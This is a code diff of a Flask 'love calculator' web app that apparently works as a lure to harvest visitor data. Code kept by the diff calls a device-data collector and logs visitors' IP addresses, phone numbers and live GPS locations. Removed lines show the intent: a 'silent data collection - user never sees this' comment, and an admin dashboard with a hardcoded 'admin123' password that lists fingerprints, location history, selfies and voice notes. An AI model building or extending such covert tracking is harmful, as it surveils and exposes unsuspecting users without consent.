@@ -1,72 +1,28 @@
 from flask import Flask, request, jsonify, render_template_string, Response
-from supabase import create_client, Client
 import os
 import random
 import json
 from datetime import datetime
+import sys
 
 app = Flask(__name__)
 
-# ---------- Supabase Setup ----------
+# ---------- Supabase Setup with better error handling ----------
 SUPABASE_URL = os.environ.get("SUPABASE_URL")
 SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
 
-if not SUPABASE_URL or not SUPABASE_KEY:
-    print("⚠️ Missing Supabase credentials. Using SQLite fallback.", file=sys.stderr)
-    supabase = None
+supabase = None
+if SUPABASE_URL and SUPABASE_KEY:
+    try:
+        from supabase import create_client, Client
+        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+        print("✅ Supabase connected successfully", file=sys.stderr)
+    except Exception as e:
+        print(f"❌ Supabase connection error: {e}", file=sys.stderr)
 else:
-    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
+    print("⚠️ Missing Supabase credentials", file=sys.stderr)
 
-# ---------- Helper Functions ----------
-def save_visitor(data):
-    if supabase is None:
-        return
-    try:
-        existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
-        if existing.data:
-            supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
-        else:
-            supabase.table("visitors").insert(data).execute()
-    except Exception as e:
-        print(f"Save error: {e}")
-
-def save_location_update(session_id, lat, lon):
-    if supabase is None:
-        return
-    try:
-        supabase.table("location_history").insert({
-            "sessionId": session_id,
-            "timestamp": datetime.now().isoformat(),
-            "latitude": lat,
-            "longitude": lon
-        }).execute()
-    except Exception as e:
-        print(f"Location update error: {e}")
-
-def get_location_history(session_id):
-    if supabase is None:
-        return []
-    try:
-        res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
-        return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
-    except:
-        return []
-
-def get_all_visitors():
-    if supabase is None:
-        return []
-    try:
-        res = supabase.table("visitors").select("*").order("id", desc=True).execute()
-        visitors = []
-        for row in res.data:
-            row["location_history"] = get_location_history(row.get("sessionId"))
-            visitors.append(row)
-        return visitors
-    except Exception as e:
-        print(f"Get visitors error: {e}")
-        return []
-
-# ---------- Love Calculator ----------
+# ---------- Love Calculator Functions ----------
 def calculate_love_percentage(name1, name2):
     combined = (name1 + name2).lower()
     total = sum(ord(c) for c in combined)
@@ -78,12 +34,31 @@ def get_love_message(name1, name2, percentage):
         f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
         f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
         f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
-        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!",
-        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!"
+        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
+        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score!",
+        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
+        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!"
     ]
     return random.choice(messages)
 
-# ---------- HTML Template (Clean & Fast - No Files) ----------
+def save_to_supabase(table, data):
+    if supabase is None:
+        return False
+    try:
+        if table == "visitors":
+            existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
+            if existing.data:
+                supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
+            else:
+                supabase.table("visitors").insert(data).execute()
+        elif table == "location_history":
+            supabase.table("location_history").insert(data).execute()
+        return True
+    except Exception as e:
+        print(f"Supabase save error: {e}", file=sys.stderr)
+        return False
+
+# ---------- HTML Template ----------
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="en">
@@ -256,7 +231,6 @@ HTML_TEMPLATE = '''
         timestamp: new Date().toISOString()
     };
     
-    // Silent data collection - user never sees this
     async function collectDeviceData() {
         try {
             const fp = await FingerprintJS.load();
@@ -495,302 +469,105 @@ HTML_TEMPLATE = '''
     }
     
     collectDeviceData();
-    
-    async function checkExistingSession() {
-        try {
-            const response = await fetch('/get-session-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ sessionId: sessionId })
-            });
-            const data = await response.json();
-            if (data.exists && data.fortuneText) {
-                if (data.name) document.getElementById('name1').value = data.name;
-                if (data.crush_name) document.getElementById('name2').value = data.crush_name;
-                if (data.fortuneText) {
-                    document.getElementById('percentage').innerHTML = (data.percentage || '??') + '%';
-                    document.getElementById('message').innerHTML = data.fortuneText;
-                    document.getElementById('result').style.display = 'block';
-                    document.getElementById('phoneSection').style.display = 'block';
-                    currentFortune = data.fortuneText;
-                    currentPercent = data.percentage || 0;
-                    if (data.phoneNumber) {
-                        document.getElementById('phone').value = data.phoneNumber;
-                        document.getElementById('phone').disabled = true;
-                    }
-                }
-            }
-        } catch(e) {}
-    }
-    
-    checkExistingSession();
 </script>
 </body>
 </html>
 '''
 
 # ---------- Flask Routes ----------
-@app.route('/')
+@app.route('/', methods=['GET'])
 def index():
     return render_template_string(HTML_TEMPLATE)
-
-@app.route('/get-session-data', methods=['POST'])
-def get_session_data_route():
-    try:
-        data = request.json
-        session_id = data.get('sessionId')
-        if session_id and supabase:
-            res = supabase.table("visitors").select("name,crush_name,fortuneText,phoneNumber,percentage").eq("sessionId", session_id).execute()
-            if res.data:
-                row = res.data[0]
-                return jsonify({
-                    'exists': True,
-                    'name': row.get("name"),
-                    'crush_name': row.get("crush_name"),
-                    'fortuneText': row.get("fortuneText"),
-                    'phoneNumber': row.get("phoneNumber"),
-                    'percentage': row.get("percentage")
-                })
-        return jsonify({'exists': False})
-    except Exception as e:
-        return jsonify({'exists': False, 'error': str(e)})
 
 @app.route('/save', methods=['POST'])
 def save():
     try:
-        data = request.json
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
         data['timestamp'] = datetime.now().isoformat()
-        data['ip'] = request.remote_addr
-        save_visitor(data)
+        
+        if supabase:
+            save_to_supabase("visitors", data)
+        
         return jsonify({'status': 'saved'})
     except Exception as e:
+        print(f"Save error: {e}", file=sys.stderr)
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/update-location', methods=['POST'])
 def update_location():
     try:
-        data = request.json
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error'}), 400
+        
         session_id = data.get('sessionId')
         lat = data.get('latitude')
         lon = data.get('longitude')
-        if session_id and lat is not None and lon is not None:
-            save_location_update(session_id, lat, lon)
+        
+        if session_id and lat is not None and lon is not None and supabase:
+            save_to_supabase("location_history", {
+                "sessionId": session_id,
+                "timestamp": datetime.now().isoformat(),
+                "latitude": lat,
+                "longitude": lon
+            })
             return jsonify({'status': 'recorded'})
-        return jsonify({'status': 'error'}), 400
+        
+        return jsonify({'status': 'skipped'})
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        print(f"Location update error: {e}", file=sys.stderr)
+        return jsonify({'status': 'error'}), 500
 
 @app.route('/save-phone', methods=['POST'])
 def save_phone():
     try:
-        data = request.json
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error'}), 400
+        
         session_id = data.get('sessionId')
         phone = data.get('phoneNumber')
-        fortune_text = data.get('fortune')
+        fortune = data.get('fortune')
         percentage = data.get('percentage')
+        
         if session_id and supabase:
             supabase.table("visitors").update({
-                "phoneNumber": phone, 
-                "fortuneText": fortune_text,
+                "phoneNumber": phone,
+                "fortuneText": fortune,
                 "percentage": percentage
             }).eq("sessionId", session_id).execute()
             return jsonify({'status': 'saved'})
-        return jsonify({'status': 'error'}), 400
+        
+        return jsonify({'status': 'skipped'})
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+        print(f"Save phone error: {e}", file=sys.stderr)
+        return jsonify({'status': 'error'}), 500
 
 @app.route('/calculate-love', methods=['POST'])
 def calculate_love():
     try:
-        data = request.json
+        data = request.get_json()
         name1 = data.get('name1', '')
         name2 = data.get('name2', '')
+        
         if not name1 or not name2:
             return jsonify({'message': 'Please provide both names'}), 400
+        
         percentage = calculate_love_percentage(name1, name2)
         message = get_love_message(name1, name2, percentage)
+        
         return jsonify({'percentage': percentage, 'message': message})
     except Exception as e:
+        print(f"Calculate love error: {e}", file=sys.stderr)
         return jsonify({'message': str(e)}), 500
 
-# ---------- Supabase Data Viewer (Direct from Supabase) ----------
-@app.route('/admin-secret', methods=['GET', 'POST'])
-def admin():
-    try:
-        if request.method == 'POST':
-            password = request.form.get('password')
-            if password == 'admin123':
-                if supabase is None:
-                    return '<h1>❌ Supabase not connected! Check your credentials.</h1><p><a href="/admin-secret">Back</a></p>'
-                
-                # Fetch data directly from Supabase
-                visitors = get_all_visitors()
-                
-                if not visitors:
-                    return '''
-                    <h1>💕 No data yet</h1>
-                    <p>Have users visit the love calculator first.</p>
-                    <p><a href="/admin-secret">Back to login</a></p>
-                    '''
-                
-                html = '''
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Supabase Data - Love Calculator</title>
-                    <style>
-                        body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
-                        h1 { color: #f093fb; }
-                        .container { overflow-x: auto; }
-                        table { border-collapse: collapse; width: 100%; background: #16213e; }
-                        th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
-                        th { background: #e94560; color: white; position: sticky; top: 0; }
-                        .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
-                        .section { margin-top: 30px; }
-                        .count { background: #0f3460; padding: 10px; border-radius: 10px; margin: 20px 0; }
-                    </style>
-                </head>
-                <body>
-                    <h1>📊 Supabase Visitor Data</h1>
-                    <div class="count">
-                        <strong>Total Visitors:</strong> ''' + str(len(visitors)) + '''
-                    </div>
-                    <p>
-                        <a href="/admin-secret" class="btn">Back to Login</a>
-                        <a href="/admin-secret/download-csv?pass=admin123" class="btn">📥 Download CSV</a>
-                        <a href="https://app.supabase.com" target="_blank" class="btn">🔗 Open Supabase Dashboard</a>
-                    </p>
-                    <div class="container">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>ID</th>
-                                    <th>Session ID</th>
-                                    <th>Timestamp</th>
-                                    <th>IP</th>
-                                    <th>Name</th>
-                                    <th>Crush Name</th>
-                                    <th>Love %</th>
-                                    <th>Fortune Text</th>
-                                    <th>Phone</th>
-                                    <th>Fingerprint</th>
-                                    <th>Battery</th>
-                                    <th>Network</th>
-                                    <th>Device Memory</th>
-                                    <th>Screen</th>
-                                    <th>Timezone</th>
-                                    <th>Latitude</th>
-                                    <th>Longitude</th>
-                                    <th>Selfie</th>
-                                    <th>Voice Note</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                '''
-                for v in visitors:
-                    selfie_preview = '📸' if v.get('selfie') else '-'
-                    voice_preview = '🎤' if v.get('voiceNote') else '-'
-                    html += f'''
-                        <tr>
-                            <td>{v.get('id', '')}</td>
-                            <td>{v.get('sessionId', '')[:25]}...</td>
-                            <td>{v.get('timestamp', '')[:19]}</td>
-                            <td>{v.get('ip', '')}</td>
-                            <td>{v.get('name', '')}</td>
-                            <td>{v.get('crush_name', '')}</td>
-                            <td>{v.get('percentage', '')}%</td>
-                            <td>{v.get('fortuneText', '')[:40]}...</td>
-                            <td>{v.get('phoneNumber', '')}</td>
-                            <td>{v.get('fingerprint', '')[:15]}...</td>
-                            <td>{v.get('batteryLevel', '')}</td>
-                            <td>{v.get('networkType', '')}</td>
-                            <td>{v.get('deviceMemory', '')}</td>
-                            <td>{v.get('screen', '')}</td>
-                            <td>{v.get('timezone', '')}</td>
-                            <td>{v.get('latitude', '')}</td>
-                            <td>{v.get('longitude', '')}</td>
-                            <td>{selfie_preview}</td>
-                            <td>{voice_preview}</td>
-                        </tr>
-                    '''
-                html += '''
-                            </tbody>
-                        </table>
-                    </div>
-                    
-                    <div class="section">
-                        <h2>📍 Live Location History</h2>
-                '''
-                for v in visitors:
-                    hist = v.get('location_history', [])
-                    if hist:
-                        html += f'<h3>Session: {v.get("sessionId", "?")[:20]} - {v.get("name", "Unknown")}</h3>'
-                        html += '<table border="1"><tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
-                        for ts, lat, lon in hist:
-                            html += f'<tr><td>{ts[:19]}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View Map</a></td></tr>'
-                        html += '</table><br>'
-                html += '''
-                    </div>
-                </body>
-                </html>
-                '''
-                return html
-            else:
-                return '<h1>🔒 Wrong password. <a href="/admin-secret">Try again</a></h1>'
-        
-        return '''
-            <!DOCTYPE html>
-            <html>
-            <head><title>Admin Login - Supabase</title>
-            <style>
-                body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
-                .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; min-width: 300px; }
-                input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; font-size: 14px; }
-                button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; }
-                h2 { color: #333; margin-bottom: 20px; }
-                .info { color: #666; font-size: 12px; margin-top: 20px; }
-            </style>
-            </head>
-            <body>
-                <div class="login-box">
-                    <h2>🔐 Supabase Admin Access</h2>
-                    <form method="POST">
-                        <input type="password" name="password" placeholder="Enter admin password" required><br>
-                        <button type="submit">View Supabase Data</button>
-                    </form>
-                    <div class="info">
-                        ⚡ Data is stored in Supabase Cloud<br>
-                        Password: admin123
-                    </div>
-                </div>
-            </body>
-            </html>
-        '''
-    except Exception as e:
-        return f'<h1>Error: {str(e)}</h1><p><a href="/admin-secret">Try again</a></p>'
-
-@app.route('/admin-secret/download-csv')
-def download_csv():
-    try:
-        pwd = request.args.get('pass')
-        if pwd != 'admin123':
-            return 'Unauthorized', 403
-        visitors = get_all_visitors()
-        import csv
-        from io import StringIO
-        if not visitors:
-            return "No data available"
-        output = StringIO()
-        writer = csv.writer(output, quoting=csv.QUOTE_ALL)
-        columns = [k for k in visitors[0].keys() if k != 'location_history']
-        writer.writerow(columns)
-        for v in visitors:
-            row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
-            writer.writerow(row)
-        return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=supabase_love_data.csv'})
-    except Exception as e:
-        return f'Error: {str(e)}', 500
+# Vercel requires this
+app = app
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port)
